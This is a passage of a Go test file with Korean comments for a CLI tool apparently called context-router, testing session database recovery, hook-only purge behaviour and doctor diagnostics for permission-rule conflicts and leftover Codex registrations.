		t.Fatalf("corrupt helper: offset out of range (size=%d off=%d)", len(raw), off)
	}
	cp := append([]byte(nil), raw...)
	for i := 0; i < 40; i++ {
		cp[off+i] = 0xEE
	}
	if err := os.WriteFile(dbPath, cp, 0o600); err != nil {
		t.Fatal(err)
	}
}

// TestRunSessionRecover_HappyPath — 태스크9b: 훼손 DB → `session recover` CLI 경로가 인양·게시를
// 완료하고 stderr에 결과를 보고한다. stdout은 비어 있어야 한다(recover는 CLI 결과 전용 규약상
// stdout 출력이 없는 것이 안전 기본, 진행 보고는 stderr 전용).
func TestRunSessionRecover_HappyPath(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	corruptSessionEvents(t, dbDir, 400)

	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", canon.WorktreeID}
	if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run session recover err=%v stderr=%s", err, errOut.String())
	}
	if out.Len() != 0 {
		t.Fatalf("stdout should be empty for recover, got %q", out.String())
	}
	if !strings.Contains(errOut.String(), "인양 완료") {
		t.Fatalf("stderr missing recovery report: %s", errOut.String())
	}
	if _, statErr := os.Stat(filepath.Join(dbDir, "session.recover-pending")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("marker should be gone after recover, stat err=%v", statErr)
	}
}

// TestRunSessionRecover_ServerRunning_RejectsImmediately — 태스크9b: 서버(shared lease 보유)
// 실행 중이면 `session recover`가 즉시 거부돼야 한다(대기 없음).
func TestRunSessionRecover_ServerRunning_RejectsImmediately(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	defer func() { _ = d.Close() }()

	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", canon.WorktreeID}
	err = Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut)
	if !errors.Is(err, session.ErrLeaseHeld) {
		t.Fatalf("err=%v want session.ErrLeaseHeld (out=%s stderr=%s)", err, out.String(), errOut.String())
	}
}

// TestRunSessionRecover_PublishInterrupted_DelegatesDespiteMissingDB — 최종리뷰 A1(Critical)
// 회귀: 게시(⑥) rename 도중 crash로 session.db만 사라졌지만 복구 자산(백업 main + 마커)이
// 남은 상태에서 CLI recover가 "session.db 없음"으로 거부하지 않고 session.Recover에 위임해
// 완료해야 한다(수정 전엔 session.db stat 실패로 재개 분기가 CLI로 도달 불가 → 영구 wedge).
// session 패키지의 unexported 인양본을 만들 수 없으므로, 건강 DB를 백업 family로 rename해
// restoreLatestBackup 경로로 재개가 성립하는 등가 상태를 주입한다.
func TestRunSessionRecover_PublishInterrupted_DelegatesDespiteMissingDB(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)

	// 1) 건강한 session.db를 만든다(단일 파일 — Close가 wal_checkpoint(TRUNCATE)).
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	for i := 0; i < 5; i++ {
		if _, _, _, err := d.Append(session.Event{Type: "note", Summary: fmt.Sprintf("evt-%d", i)}); err != nil {
			t.Fatalf("append: %v", err)
		}
	}
	if err := d.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	// 2) 게시 중단 상태 주입: session.db family를 백업 main으로 rename(→ session.db 부재) +
	//    복구 마커 생성. bak ts 포맷은 backupOriginal과 동일(사전순=시간순 정렬 가능).
	bakMain := "session.db.bak-20260101T000000.000000000Z"
	for _, suffix := range []string{"", "-wal", "-shm"} {
		src := filepath.Join(dbDir, "session.db"+suffix)
		if _, statErr := os.Stat(src); statErr == nil {
			if err := os.Rename(src, filepath.Join(dbDir, bakMain+suffix)); err != nil {
				t.Fatalf("rename %s: %v", suffix, err)
			}
		}
	}
	if err := os.WriteFile(filepath.Join(dbDir, "session.recover-pending"), nil, 0o600); err != nil {
		t.Fatalf("marker: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(dbDir, "session.db")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("precondition: session.db should be absent, stat err=%v", statErr)
	}

	// 3) CLI recover — session.db 부재에도 위임·완료해야 한다.
	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", canon.WorktreeID}
	if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run session recover err=%v stderr=%s", err, errOut.String())
	}
	if !strings.Contains(errOut.String(), "인양 완료") {
		t.Fatalf("stderr missing recovery report: %s", errOut.String())
	}
	if _, statErr := os.Stat(filepath.Join(dbDir, "session.recover-pending")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("marker should be gone after recover, stat err=%v", statErr)
	}
	// 게시된 session.db가 건강해야 한다.
	reader, err := session.OpenReadOnly(dbDir)
	if err != nil {
		t.Fatalf("OpenReadOnly: %v", err)
	}
	defer func() { _ = reader.Close() }()
	var qc string
	if err := reader.QueryRow("PRAGMA quick_check").Scan(&qc); err != nil || qc != "ok" {
		t.Fatalf("published db quick_check=%q err=%v want ok", qc, err)
	}
}

// TestRecover_UnknownWorktreeListsCandidates — 부채정리 ④: 존재하지 않는 --worktree id로
// recover 시 오류 문구가 실제 worktree 후보 id를 안내해야 한다(listWorktreeDirs 재사용). 수정
// 전에는 opaque하게 "복구 자산 확인 실패"로 끝났다.
func TestRecover_UnknownWorktreeListsCandidates(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	// 실제 worktree 하나를 만들어 후보가 존재하게 한다.
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	_ = d.Close()

	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", "nonexistent-wid"}
	err = Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for nonexistent worktree id")
	}
	if !strings.Contains(err.Error(), canon.WorktreeID) {
		t.Fatalf("error should list candidate worktree id %q, got %q", canon.WorktreeID, err.Error())
	}
}

// seedHookOnlyProject — storeRoot 하위에 projectRoot의 canonical ID로 hook 단독(귀속) + file
// (비귀속) 아티팩트를 시드하고 (pid, projDir, ownedHash)를 반환한다. purge --hook-only CLI
// 테스트 공용 시드 — seedShadowContentDB(귀속 hash 반환)를 그대로 재사용한다.
func seedHookOnlyProject(t *testing.T) (pid, projDir, ownedHash string) {
	t.Helper()
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	pid = canon.ProjectID
	projDir = filepath.Join(storeRoot, "projects", pid)
	ownedHash = seedShadowContentDB(t, projDir)
	// storeRoot를 반환하지 않는 대신, 호출부는 projDir에서 storeRoot를 역산한다(projects/<pid>).
	return pid, projDir, ownedHash
}

// storeRootOf — projDir(=<storeRoot>/projects/<pid>)에서 storeRoot를 역산한다.
func storeRootOf(projDir string) string { return filepath.Dir(filepath.Dir(projDir)) }

// TestPurgeHookOnlyCLI — e2e: --hook-only가 전역 confirm/전체삭제(os.RemoveAll)에 도달하지 않고
// shadow 귀속 hash만 회수하며(보고 문면), content.db와 explicit(file) 소스는 보존한다. CAS
// 파일을 2h 전으로 노후화해 age-gate를 통과시켜 실제 물리 회수까지 확인한다.
func TestPurgeHookOnlyCLI(t *testing.T) {
	pid, projDir, ownedHash := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)
	casPath := filepath.Join(projDir, "artifacts", ownedHash[:2], ownedHash)
	old := time.Now().Add(-2 * time.Hour) // > gcOrphanMinAge(1h) → 회수(유예 아님)
	if err := os.Chtimes(casPath, old, old); err != nil {
		t.Fatalf("age CAS file: %v", err)
	}

	var out bytes.Buffer
	args := []string{"--project", pid, "--hook-only", "--force"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}
	o := out.String()
	if !strings.Contains(o, "실회수") || !strings.Contains(o, "(1 hashes)") {
		t.Fatalf("보고 문면 없음:\n%s", o)
	}
	if !strings.Contains(o, "purge: content.db(+wal/shm) ") {
		t.Fatalf("D55 총합 보고 라인 없음:\n%s", o)
	}
	// ④ 실회수 보고가 ⑤ 총합 보고보다 먼저(스펙 §0 순서)
	if strings.Index(o, "실회수") > strings.Index(o, "purge: content.db(+wal/shm) ") {
		t.Fatalf("보고 순서 역전:\n%s", o)
	}
	// 전체 삭제 비도달: content.db 잔존.
	if _, err := os.Stat(filepath.Join(projDir, "content.db")); err != nil {
		t.Fatalf("content.db가 사라짐(전체삭제 분기에 도달) : %v", err)
	}
	// shadow 귀속 blob은 실제 회수(파일 부재).
	if _, err := os.Stat(casPath); !os.IsNotExist(err) {
		t.Fatalf("shadow CAS blob이 회수되지 않음: stat err=%v", err)
	}
	// explicit(file) 소스는 보존, hook 귀속은 0.
	sz, err := store.SizeStats(projDir)
	if err != nil || sz == nil {
		t.Fatalf("SizeStats: %v (nil=%v)", err, sz == nil)
	}
	if sz.Sources != 1 || sz.ShadowOwnedHashes != 0 {
		t.Fatalf("보존/회수 불일치: Sources=%d(want 1) ShadowOwnedHashes=%d(want 0)", sz.Sources, sz.ShadowOwnedHashes)
	}
}

// TestPurgeHookOnlyComboRejected — --hook-only는 --all/--older-than/--sessions/--gc와 조합 시
// 사용 오류(rc != 0)이고 아무것도 삭제하지 않는다(조기 분기가 store를 열기 전에 거부).
func TestPurgeHookOnlyComboRejected(t *testing.T) {
	pid, projDir, ownedHash := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)
	casPath := filepath.Join(projDir, "artifacts", ownedHash[:2], ownedHash)

	for _, args := range [][]string{
		{"--project", pid, "--hook-only", "--all"},
		{"--project", pid, "--hook-only", "--older-than", "1h"},
		{"--project", pid, "--hook-only", "--sessions"},
		{"--project", pid, "--hook-only", "--gc"},
	} {
		var out bytes.Buffer
		// failReader: 조합 거부는 confirm(입력 읽기) 이전에 일어나야 한다.
		if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err == nil {
			t.Fatalf("args=%v: want usage error, got nil", args)
		}
	}
	if _, err := os.Stat(filepath.Join(projDir, "content.db")); err != nil {
		t.Fatalf("거부된 조합이 content.db를 삭제함: %v", err)
	}
	if _, err := os.Stat(casPath); err != nil {
		t.Fatalf("거부된 조합이 shadow blob을 삭제함: %v", err)
	}
}

// TestDoctorCodexMCPLine — D52 doctor [16] 5분기(v0.9 §0). CODEX_HOME 격리 하에 각 분기 출력을
// 단정한다. 버전은 runDoctor에 넘긴 ver로 스레딩하고 픽스처 marker도 같은 ver로 조립해([9]식
// marker≠version 불일치 문구 회피) 0.9.0 하드코딩 없이 범프 후에도 유효하게 유지한다.
// write — 픽스처 파일 기록 테스트 헬퍼. 원래 TestDoctorCodexMCPLine의 지역 클로저였고,
// [20]의 잔존 감지 테스트가 같은 것을 필요로 해 파일 수준으로 올렸다.
func write(t *testing.T, path string, data []byte) {
	t.Helper()
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatalf("write %s: %v", filepath.Base(path), err)
	}
}

// TestRunDoctorFixFlag — D97 계약 1. doctor --fix는 더는 받아들여지지 않는다 — 플래그 자체가
// 지워졌다(무동작으로 남기지 않는다는 것이 D96 요구다). 인자를 하나라도 주면 거부한다.
func TestRunDoctorFixFlag(t *testing.T) {
	t.Setenv("CODEX_HOME", t.TempDir())
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "doctor", []string{"--fix"}, t.TempDir(), t.TempDir(), "0.19.0", &out, &errOut); err == nil {
		t.Fatalf("--fix가 더는 존재하지 않는데 doctor가 받아들였다: %s", out.String())
	}
	// 릴리스 리뷰 F6: 옛 구현은 flag.NewFlagSet이라 아래 철자를 전부 받아들였다 — 그중 하나를
	// 친 사용자가 일반 "예상치 않은 인자" 오류를 읽으면 그 능력이 어디로 갔는지 배우지 못하고,
	// 그 안내가 이 특수 분기의 존재 이유다. --fixture는 --fix가 아니다(느슨한 접두 매치 금지).
	for _, spelling := range []string{"--fix", "--fix=true", "-fix", "-fix=true", "-fix=false"} {
		var o, e bytes.Buffer
		err := Run(context.Background(), "doctor", []string{spelling}, t.TempDir(), t.TempDir(), "0.19.0", &o, &e)
		if err == nil {
			t.Fatalf("%s를 doctor가 받아들였다: %s", spelling, o.String())
		}
		if !strings.Contains(err.Error(), "--fix는 더는 없습니다") {
			t.Errorf("%s가 --fix 은퇴 사유를 내지 않는다: %v", spelling, err)
		}
	}
	var o2, e2 bytes.Buffer
	err := Run(context.Background(), "doctor", []string{"--fixture"}, t.TempDir(), t.TempDir(), "0.19.0", &o2, &e2)
	if err == nil {
		t.Fatal("--fixture를 doctor가 받아들였다")
	}
	if strings.Contains(err.Error(), "--fix는 더는 없습니다") {
		t.Errorf("--fixture를 --fix로 읽었다(접두 매치): %v", err)
	}
	// 인자 없는 정상 실행은 여전히 받아들인다 — 위 단정만 있으면 doctor가 인자를 통째로
	// 거부하도록 망가져도(과잉 거부) 이 테스트가 통과해버린다.
	var out2, errOut2 bytes.Buffer
	if err := Run(context.Background(), "doctor", nil, t.TempDir(), t.TempDir(), "0.19.0", &out2, &errOut2); err != nil {
		t.Fatalf("인자 없는 doctor 실행이 거부됐다: %v out=%s", err, out2.String())
	}
}

// TestDoctorShowsRunnerLine — [18] exec 러너 감지 라인(D58). 감지 결과는 환경 의존이라 접두만
// 검증한다(exec는 opt-in 프로필이라 미검출이어도 실패 게이트가 아님 — err 무시).
func TestDoctorShowsRunnerLine(t *testing.T) {
	isolateCodexHome(t)
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), t.TempDir(), "0.11.0")
	if !strings.Contains(buf.String(), "[18] exec runners:") {
		t.Fatalf("[18] 누락:\n%s", buf.String())
	}
}

// TestDoctorWarnMentionsHookOnly — [14] 경고 신문구가 --hook-only 선택 삭제를 안내하고 옛 문구
// ('무구분')는 사라졌다(설계 §8 / D38 승격).
func TestDoctorWarnMentionsHookOnly(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_STORE_WARN_BYTES", "5") // blob 10B > 5B → 발화
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	for _, want := range []string{"[14] warning:", "--hook-only", "shadow만 선택 삭제 가능"} {
		if !strings.Contains(out, want) {
			t.Fatalf("경고 신문구에 %q 없음:\n%s", want, out)
		}
	}
	if strings.Contains(out, "무구분") {
		t.Fatalf("옛 문구('무구분')가 남아 있음:\n%s", out)
	}
}

// TestHostSnippetNoExecAskRule: 호스트 안내가 exec 도구를 permissions.ask에 넣게 하지
// 않는다. ask는 무프롬프트 모드에서도 프롬프트를 강제하고 allow를 이기므로, 승인 강도는
// 호스트 권한 모드가 정하게 둔다(설계 v0.12 D64).
func TestHostSnippetNoExecAskRule(t *testing.T) {
	// ask 배열 줄에 exec 도구가 있으면 안 된다.
	for _, line := range strings.Split(hostSnippet, "\n") {
		if !strings.Contains(line, `"ask"`) {
			continue
		}
		for _, tool := range []string{"ctr_execute", "ctr_execute_file"} {
			if strings.Contains(line, tool) {
				t.Errorf("ask 안내에 exec 도구가 남아 있다: %s", line)
			}
		}
	}
	// 대신 모드 기반 설명이 있어야 한다.
	if !strings.Contains(hostSnippet, "권한 모드") {
		t.Errorf("승인 강도를 호스트 권한 모드가 정한다는 안내가 없다")
	}
}

// TestPurgeHookOnlySinglePrompt — TTY 경로에서 확인 프롬프트가 정확히 1회만 출력된다(전역
// confirmPurge와의 중복 방지 회귀 — 조기 분기가 전역 confirm 앞에 있어야 함). 견적 슬러그를
// 정확히 재구성해 입력하면 통과하고 실회수 보고까지 진행된다.
func TestPurgeHookOnlySinglePrompt(t *testing.T) {
	pid, projDir, _ := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)

	sz, err := store.SizeStats(projDir)
	if err != nil || sz == nil {
		t.Fatalf("SizeStats: %v", err)
	}
	var estB int64
	for _, b := range sz.ShadowOwned {
		estB += b
	}
	slug := fmt.Sprintf("shadow %dB(%d hashes) 선택 삭제", estB, len(sz.ShadowOwned))

	var out bytes.Buffer
	args := []string{"--project", pid, "--hook-only"} // --force 없음 → TTY 확인 경로
	if err := runPurge(context.Background(), strings.NewReader(slug+"\n"), &out, io.Discard, storeRoot, args, true); err != nil {
		t.Fatalf("runPurge(TTY) err=%v out=%s", err, out.String())
	}
	o := out.String()
	if n := strings.Count(o, "삭제 대상을 확인합니다"); n != 1 {
		t.Fatalf("확인 프롬프트가 %d회(정확히 1회여야 — 전역 confirm 중복 방지):\n%s", n, o)
	}
	if !strings.Contains(o, "실회수") {
		t.Fatalf("단일 확인 통과 후 실회수 보고 없음:\n%s", o)
	}
	// hook-only 확인 문구는 범위(shadow-owned 한정)를 명시하고 전체삭제(세션 이벤트) 문구를 쓰지 않는다.
	if strings.Contains(o, "세션 이벤트 데이터를 포함") {
		t.Fatalf("hook-only인데 전체삭제(세션 이벤트 데이터) 문구:\n%s", o)
	}
	if !strings.Contains(o, "explicit 소스는 보존") {
		t.Fatalf("hook-only 범위(shadow-owned 한정) 문구 없음:\n%s", o)
	}
}

// blockingWriter — 첫 Write에서 buf에 기록한 뒤 hit을 알리고 release가 닫힐 때까지 막는다.
// 테스트가 정확히 그 Write 지점(hook-only 보고 직후·VACUUM 직전)에 개입해 다른 연결로 쓰기
// 잠금을 선점할 수 있게 하는 결정적 배리어다(타이밍 슬립 없음 — 순수 채널 동기화).
type blockingWriter struct {
	buf     bytes.Buffer
	once    sync.Once
	hit     chan struct{}
	release chan struct{}
}

func newBlockingWriter() *blockingWriter {
	return &blockingWriter{hit: make(chan struct{}), release: make(chan struct{})}
}

func (b *blockingWriter) Write(p []byte) (int, error) {
	n, _ := b.buf.Write(p)
	b.once.Do(func() {
		close(b.hit)
		<-b.release
	})
	return n, nil
}

// TestPurgeHookOnlyVacuumFailurePropagates — D55: VACUUM 실패는 rc≠0로 전파된다(단 이미 커밋된
// hook-only 삭제분은 유지). 실회수 보고는 VACUUM보다 먼저(스펙 §3 순서) 출력된다. 보고 직후·
// VACUUM 직전에 별도 연결로 쓰기 잠금(BEGIN IMMEDIATE)을 선점해 VACUUM을 SQLITE_BUSY로 결정적으로 실패시킨다.
func TestPurgeHookOnlyVacuumFailurePropagates(t *testing.T) {
	pid, projDir, _ := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)

	// content.db에 별도 쓰기 연결(아직 잠금 미선점). WAL 모드는 db 헤더에 지속되므로 재지정 불필요.
	dbPath := filepath.ToSlash(filepath.Join(projDir, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(5000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	lockConn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = lockConn.Close() }()

	gw := newBlockingWriter()
	var errOut bytes.Buffer
	done := make(chan error, 1)
	go func() {
		done <- runPurge(context.Background(), failReader{}, gw, &errOut, storeRoot,
			[]string{"--project", pid, "--hook-only", "--force"}, false)
	}()

	// 실회수 보고가 gw.buf에 기록되길 기다린다(= PurgeHookOnly 커밋 완료·쓰기 잠금 해제됨).
	// runPurge가 보고 전에 조기 종료(오류)하면 hit이 안 오므로 done/타임아웃으로 빠르게 실패한다.
	select {
	case <-gw.hit:
	case rc := <-done:
		t.Fatalf("runPurge가 실회수 보고 전에 종료(rc=%v) — 조기 분기/보고 순서 회귀:\n%s", rc, gw.buf.String())
	case <-time.After(30 * time.Second):
		t.Fatal("실회수 보고가 30s 내 안 나옴")
	}
	if _, err := lockConn.ExecContext(context.Background(), "BEGIN IMMEDIATE"); err != nil {
		t.Fatalf("선점 BEGIN IMMEDIATE: %v", err)
	}
	close(gw.release) // runPurge 진행 → VACUUM은 선점된 잠금에 막혀 BUSY 실패

	var rc error
	select {
	case rc = <-done:
	case <-time.After(30 * time.Second):
		t.Fatal("runPurge가 30s 내 종료 안 됨(교착?)")
	}
	_, _ = lockConn.ExecContext(context.Background(), "ROLLBACK")

	// 반전(D55): VACUUM 실패는 rc≠0로 전파 — 단 이미 커밋된 hook-only 삭제분은 유지.
	if rc == nil {
		t.Fatalf("VACUUM BUSY인데 rc=nil — D55 rc≠0 계약 회귀:\n%s", gw.buf.String())
	}
	if !strings.Contains(gw.buf.String(), "실회수") {
		t.Fatalf("실회수 보고가 VACUUM 이전에 안 나옴:\n%s", gw.buf.String())
	}
}

// TestDoctorShowsPermissionLine: [19] 라인이 항상 나오고, 규칙이 없는 환경에서는 세 갈래 중
// "충돌 없음"이다. 라인 접두("[19] permissions:")만 단정하면 판정이 통째로 무력화돼도(예: ruleMatches가
// 항상 false를 돌려주는 회귀) 통과하므로 문면까지 고정한다(G5). USER 스코프는 임시 홈으로 돌려
// 실환경 설정이 판정에 섞이지 않게 한다 — 그러지 않으면 세 갈래 중 어느 것이 나올지 환경에 달린다.
func TestDoctorShowsPermissionLine(t *testing.T) {
	home := t.TempDir()
	t.Setenv("USERPROFILE", home) // windows
	t.Setenv("HOME", home)        // unix
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), t.TempDir(), "0.12.0")
	if !strings.Contains(buf.String(), "[19] permissions: ask/allow 충돌 없음") {
		t.Fatalf("[19] 충돌 없음 라인 누락:\n%s", buf.String())
	}
}

// TestDoctorReportsAskShadowedAllow: 프로젝트 settings의 ask와 도구가 겹치는 allow가 있으면 doctor가
// 그 규칙 이름을 [19]로 보고한다 — 디스크의 실제 파일에서 doctor 라인까지의 배선을 잇는 테스트다.
// 두 번째 allow(서버 단위)는 ask와 일부만 겹친다 — 겹치는 도구에서만 무력화되고 나머지 도구에서는
// 그대로 유효하므로, 문면이 "덮는다"가 아니라 "겹친다"여야 한다(R4). 판정이 교집합으로 바뀐 뒤에도
// "덮는다"로 남으면 진단이 사용자에게 그 allow 전체가 죽었다고 잘못 읽힌다.
// USER 스코프는 임시 홈으로 돌려 실환경 설정이 건수에 섞이지 않게 한다(판정은 전 스코프 합집합).
func TestDoctorReportsAskShadowedAllow(t *testing.T) {
	home := t.TempDir()
	t.Setenv("USERPROFILE", home) // windows
	t.Setenv("HOME", home)        // unix
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".claude"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	rules := `{"permissions":{"ask":["mcp__ctr-exec__ctr_execute"],` +
		`"allow":["mcp__ctr-exec__ctr_execute","mcp__ctr-exec"]}}`
	if err := os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"), []byte(rules), 0o600); err != nil {
		t.Fatalf("write settings: %v", err)
	}
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.12.0")
	if !strings.Contains(buf.String(), "[19] permissions: ask와 겹치는 allow 항목 2건 — mcp__ctr-exec__ctr_execute, mcp__ctr-exec") {
		t.Fatalf("[19] 충돌 보고 누락:\n%s", buf.String())
	}
}

// TestDoctorIndeterminateOnUnreadableScope: 읽을 수 없는 스코프가 하나라도 있으면 [19]는
// "충돌 없음"이 아니라 판정 불가로 떨어진다(리뷰 F1 — 거짓 clean 방지). settings.json 자리에
// 디렉터리를 두어 os.ReadFile이 미존재가 아닌 오류를 내게 만든다. USER 스코프는 임시 홈으로 돌린다.
func TestDoctorIndeterminateOnUnreadableScope(t *testing.T) {
	home := t.TempDir()
	t.Setenv("USERPROFILE", home) // windows
	t.Setenv("HOME", home)        // unix
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".claude", "settings.json"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.12.0")
	if !strings.Contains(buf.String(), "[19] permissions: ask/allow 판정 불가") {
		t.Fatalf("읽을 수 없는 스코프인데 판정 불가가 아니다:\n%s", buf.String())
	}
}

// TestDoctorPermissionLineOnCheckFailure: 판정 자체가 실패하면 "충돌 없음"이 아니라 판정 불가를
// 알린다 — 확인하지 않은 것을 확인했다고 말하는 진단은 침묵보다 사용자를 더 오도한다. 홈 디렉터리
// 해석이 유일한 실패 경로라 USERPROFILE/HOME을 비워 재현한다. [19]는 한 줄만 나오므로 판정 불가
// 라인의 존재가 곧 "충돌 없음"을 찍지 않았다는 증거다.
func TestDoctorPermissionLineOnCheckFailure(t *testing.T) {
	t.Setenv("USERPROFILE", "") // windows
	t.Setenv("HOME", "")        // unix
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), t.TempDir(), "0.12.0")
	if !strings.Contains(buf.String(), "[19] permissions: ask/allow 판정 불가") {
		t.Fatalf("판정 실패인데 판정 불가 라인이 없다:\n%s", buf.String())
	}
}

// TestDoctorIndexesRender — D73: 병기가 quick_check 뒤에 오고 기존 부분문자열 단정이 그대로
// 통과한다(골든 갱신 없이 정보만 더한다).
func TestDoctorIndexesRender(t *testing.T) {
	isolateCodexHome(t)
	// 전용 doctor 실행 헬퍼는 없다 — 기존 셋업 두 개로 조립해 runDoctor를 직접 부른다.
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	seedShadowContentDB(t, projDir) // writable Open이라 여기서 색인이 생긴다
	var buf bytes.Buffer
	// doctor는 실패 항목이 있으면 오류를 낼 수 있다 — 이 테스트는 [3] 렌더만 보므로 출력으로 판정하고
	// 오류는 로그로 남긴다.
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Logf("runDoctor: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "user_version=1 quick_check=ok") {
		t.Fatalf("기존 부분문자열 단정이 깨졌다:\n%s", out)
	}
	if !strings.Contains(out, "quick_check=ok indexes=3/3") {
		t.Fatalf("indexes 병기가 quick_check 뒤에 없다:\n%s", out)
	}
}

// TestCodexEnvNotTableStopsInstall — 재기준선 행 4. env 우변이 인라인 테이블이 아니면 넷이

// TestDoctorCodexHandEditDetection — D97 계약 2 핵심 표. doctor의 새 [16] 감지원
// (codexServerHeaders, codex_scan.go)이 codex_toml.go를 전혀 거치지 않고 세 갈래를 옳게
// 가르는지 잰다: 등록물 있음(파일:줄+다음 걸음 보고) · 등록물 없음(보고 없음, 무관 설정만
// 있어도) · 파일 자체 없음(보고 없음). 네 번째 갈래(무효 TOML에서도 보고)가 D97이 codex_toml.go의
// 정교한 스캐너를 버리고 줄 단위 스캐너로 갈아 끼우면서 "알고 받은 대가"의 완화 지점이다 —
// 이 갈래가 깨지면 그 대가를 실제로 못 받고 있다는 뜻이다.
// 이름은 더는 인쇄하지 않는다(리뷰 I2) — 인용된 헤더 이름에 점이 있으면 첫 점 자르기가 틀린
// 이름을 낼 수 있고, 그 값을 codex mcp remove에 넘기면 없는 이름에도 exit 0이 나 "지웠다"는
// 착각을 남긴다. "등록물 있음" 갈래에서 종료코드도 함께 잰다(리뷰 M6) — 이 보고가 failed에
// 계상되지 않는다는 것을 discard하지 않고 확인한다.
func TestDoctorCodexHandEditDetection(t *testing.T) {
	cases := []struct {
		name       string
		cfg        string // "" = config.toml을 만들지 않는다
		wantReport bool
		wantParses bool // wantReport일 때만 의미 — 다음 걸음이 codex mcp list/remove 안내인지(true), "직접 열어 정리" 안내인지(false, 재검토 리뷰 6)
	}{
		{"등록물 있음", "[mcp_servers.ctr]\ncommand = \"context-router\"\n", true, true},
		{"등록물 없음 — 무관 설정만", "[model]\nname = \"gpt\"\n", false, false},
		{"파일 자체가 없음", "", false, false},
		{"무효 TOML이어도 헤더는 잡힌다(닫히지 않은 배열)", "[mcp_servers.ctr]\ncommand = \"context-router\"\nbad = [1, 2,\n", true, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			home := isolateCodexHome(t)
			if c.cfg != "" {
				writeCodexConfig(t, home, c.cfg)
			}
			out, err := doctorOut(t, t.TempDir())
			got := strings.Contains(out, "플러그인 이전 방식의 등록물이 남아 있다")
			if got != c.wantReport {
				t.Errorf("report=%v want %v:\n%s", got, c.wantReport, out)
			}
			if err != nil {
				t.Errorf("이 보고는 실패 항목에 계상되면 안 된다(리뷰 M6) — err=%v:\n%s", err, out)
			}
			if !c.wantReport {
				return
			}
